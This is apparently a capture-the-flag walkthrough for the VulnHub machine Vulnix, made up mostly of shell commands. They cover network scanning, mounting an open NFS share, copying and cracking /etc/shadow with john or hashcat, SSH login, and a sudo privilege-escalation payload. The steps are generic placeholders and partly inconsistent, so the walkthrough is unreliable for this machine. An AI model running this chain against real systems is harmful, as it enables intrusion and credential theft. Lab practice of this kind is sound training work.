# Vulnix (HackLAB: Vulnix): OSCP Walkthrough

> **Machine:** Vulnix
> **Source:** HackLAB series on VulnHub
> **IP Address:** 192.168.x.x (DHCP)
> **OS:** Linux (Ubuntu Server 12.04)
> **Difficulty:** Intermediate
> **Focus:** NFS, password cracking, SSH privilege escalation

---

## Recon

```bash
# Discover target IP
sudo netdiscover -i eth0

# Full port scan with service detection
nmap -sV -sC -p- 192.168.x.x

# Short scan for quick overview
nmap -sV -sC -p 22,80,111,139,445,2049 192.168.x.x
```

**Expected results:**
- Port 22: SSH (OpenSSH)
- Port 111: RPC portmapper
- Port 2049: NFS (Network File System)

---

## Enumeration

### NFS Enumeration

```bash
# Show NFS exports
showmount -e 192.168.x.x

# Mount NFS shares
sudo mkdir -p /mnt/nfs_share
sudo mount -t nfs 192.168.x.x:/ /mnt/nfs_share

# List contents of mounted share
ls -la /mnt/nfs_share/
```

> **Note:** If NFS is exportable without authentication, you may gain access to sensitive files including `/etc/shadow`, `/etc/passwd`, or backup files containing credentials.

### Password Cracking

```bash
# Copy shadow and passwd files from NFS mount
cp /mnt/nfs_share/etc/shadow ./shadow
cp /mnt/nfs_share/etc/passwd ./passwd

# Crack passwords with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt shadow

# Or use hashcat
hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt
```

### SSH Enumeration

```bash
# Try cracked credentials via SSH
ssh username@192.168.x.x

# If you have a password, try SSH with it
ssh user@192.168.x.x -p 22
```

> **Screenshots:** See Key Takeaways section

---

## Exploitation

### Step-by-step

1. **Discover target IP** via `netdiscover`.
2. **Nmap scan** to identify open ports.
3. **Enumerate NFS exports** using `showmount -e`.
4. **Mount NFS share** and extract `/etc/shadow`.
5. **Crack password hashes** using `john` or `hashcat`.
6. **SSH into the machine** with cracked credentials.

```bash
# Full exploitation chain example
netdiscover -i eth0                          # Find IP
nmap -sV -sC -p- 192.168.x.x                # Full scan
showmount -e 192.168.x.x                     # NFS exports
sudo mount -t nfs 192.168.x.x:/ /mnt/nfs    # Mount
cp /mnt/nfs/etc/shadow .                      # Extract hash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow  # Crack
ssh crackeduser@192.168.x.x                 # Login
```

---

## Privesc

### SSH Privesc via sudo misconfiguration

```bash
# Check sudo privileges after SSH login
sudo -l

# If allowed to run a script as root, write a payload
echo '/bin/bash' > /tmp/privesc.sh
chmod +x /tmp/privesc.sh
sudo /path/to/allowed/script /tmp/privesc.sh
```

### Home Directory Enumeration

```bash
# Look for SSH keys or credentials in home directories
find /home -name "*.pem" -o -name "id_rsa" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# Check for readable backup files
find /mnt/nfs_share -type f -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
```

### Read root flag

```bash
# Once root access is obtained
cat /root/root.txt
cat /root/trophy
```

## Key Takeaways

1. **NFS misconfiguration is a goldmine**: if NFS exports allow `no_root_squash`, you can create files as root on the NFS share.
2. **Always check mounted NFS for sensitive files**: `/etc/shadow`, SSH keys, config files with credentials.
3. **Password cracking is essential**: `john` and `hashcat` are the go-to tools for hash cracking.
4. **SSH is the likely entry point** after cracking credentials from NFS or other services.
5. **Check sudoers** after gaining initial shell access: scripts run as root can be leveraged for privilege escalation.
6. **NFS `no_root_squash`** allows UID 0 (root) from the client to have root privileges on the exported filesystem.

---

*M4d3 w1th ❤️ by Ankit Patidar*
